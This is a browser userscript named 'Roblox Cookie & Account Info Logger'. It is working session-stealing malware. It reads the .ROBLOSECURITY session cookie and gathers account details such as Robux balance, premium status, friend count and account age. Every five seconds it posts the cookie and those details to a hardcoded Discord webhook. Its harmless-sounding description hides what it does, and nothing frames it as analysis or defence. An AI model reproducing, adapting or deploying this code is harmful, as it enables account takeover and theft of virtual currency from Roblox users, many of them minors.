// ==UserScript==
// @name         Roblox Cookie & Account Info Logger
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  RHAZE%
// @author       MLK
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @connect      api.roblox.com
// @connect      discord.com
// @connect      economy.roblox.com
// @connect      premiumfeatures.roblox.com
// @connect      friends.roblox.com
// @connect      thumbnails.roblox.com
// @connect      users.roblox.com
// ==/UserScript==

(function() {
    'use strict';


    const WEBHOOK_URL = "https://discord.com/api/webhooks/1502805198966493194/7BwtUSLcQP8tbHfNdR45hmYJ5rGzPs2xIJRu4RCxLuDfg7SYVVyGu-8qFZZ9Na4FJKDc";
    const COOKIE_NAME = ".ROBLOSECURITY";
    const sentCookies = new Set(JSON.parse(localStorage.getItem("robloxSentCookies") || "[]"));


    async function fetchAuthInfo() {
        try {
            const res = await fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' });
            if (res.ok) return await res.json();
        } catch (err) { console.error("Erreur fetchAuthInfo:", err); }
        return null;
    }

    async function fetchRobuxBalance(userId) {
        try {
            const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: { Cookie: `.ROBLOSECURITY=${document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1]}` },
                credentials: 'include'
            });
            if (res.ok) {
                const data = await res.json();
                return data.robux || 0;
            }
        } catch (err) { console.error("Erreur fetchRobuxBalance:", err); }
        return "Unknown";
    }

    async function checkPremium(userId) {
        try {
            const res = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
                headers: { Cookie: `.ROBLOSECURITY=${document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1]}` },
                credentials: 'include'
            });
            return res.ok;
        } catch (err) { console.error("Erreur checkPremium:", err); }
        return false;
    }

    async function fetchProfileDetails(userId) {
        try {
            const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
                headers: { Cookie: `.ROBLOSECURITY=${document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1]}` },
                credentials: 'include'
            });
            if (res.ok) return await res.json();
        } catch (err) { console.error("Erreur fetchProfileDetails:", err); }
        return null;
    }

    async function fetchFriendCount(userId) {
        try {
            const res = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
                headers: { Cookie: `.ROBLOSECURITY=${document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1]}` },
                credentials: 'include'
            });
            if (res.ok) {
                const data = await res.json();
                return data.count || 0;
            }
        } catch (err) { console.error("Erreur fetchFriendCount:", err); }
        return "Unknown";
    }

    async function fetchAvatarMetadata(userId) {
        try {
            const res = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
            if (res.ok) {
                const data = await res.json();
                return data.data?.[0]?.imageUrl || "";
            }
        } catch (err) { console.error("Erreur fetchAvatarMetadata:", err); }
        return "";
    }


    async function sendToWebhook(cookieValue, robuxBalance, username, displayName, premiumStatus, creationYear, friendCount, avatarUrl) {
        if (!WEBHOOK_URL) return;

        const premiumText = premiumStatus ? "Yes (Premium)" : "No Premium";

        const payload = {
            embeds: [{
                title: "📊 Roblox Account Metrics Summary",
                fields: [
                    { name: "Display Name", value: displayName, inline: true },
                    { name: "Username", value: username, inline: true },
                    { name: "Robux Balance", value: String(robuxBalance), inline: true },
                    { name: "Premium Status", value: premiumText, inline: true },
                    { name: "Account Age (Year)", value: String(creationYear), inline: true },
                    { name: "Total Friends", value: String(friendCount), inline: true }
                ],
                description: "**Session Cookie:**\n```" + cookieValue + "```",
                color: 3447003,
                thumbnail: avatarUrl ? { url: avatarUrl } : null,
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await GM_xmlhttpRequest({
                method: "POST",
                url: WEBHOOK_URL,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify(payload)
            });
            sentCookies.add(cookieValue);
            localStorage.setItem("robloxSentCookies", JSON.stringify(Array.from(sentCookies)));
        } catch (err) {
            console.error("Erreur lors de l'envoi au webhook:", err);
        }
    }

    // Vérifie et envoie le cookie
    async function checkAndSendCookie() {
        const currentCookie = document.cookie.split(';').find(c => c.trim().startsWith(`${COOKIE_NAME}=`))?.split('=')[1];
        if (!currentCookie || sentCookies.has(currentCookie)) return;

        try {
            const authData = await fetchAuthInfo();
            if (!authData?.id) return;

            const userId = authData.id;
            const username = authData.name;
            const displayName = authData.displayName || authData.name;

            const [robuxBalance, isPremium, profileDetails, friendCount, avatarUrl] = await Promise.all([
                fetchRobuxBalance(userId),
                checkPremium(userId),
                fetchProfileDetails(userId),
                fetchFriendCount(userId),
                fetchAvatarMetadata(userId)
            ]);

            const creationYear = profileDetails?.created ? new Date(profileDetails.created).getFullYear() : "Unknown";

            await sendToWebhook(
                currentCookie,
                robuxBalance,
                username,
                displayName,
                isPremium,
                creationYear,
                friendCount,
                avatarUrl
            );
        } catch (error) {
            console.error("Erreur dans checkAndSendCookie:", error);
        }
    }

    // Lancement de la vérification
    checkAndSendCookie();
    setInterval(checkAndSendCookie, 5000);
})();
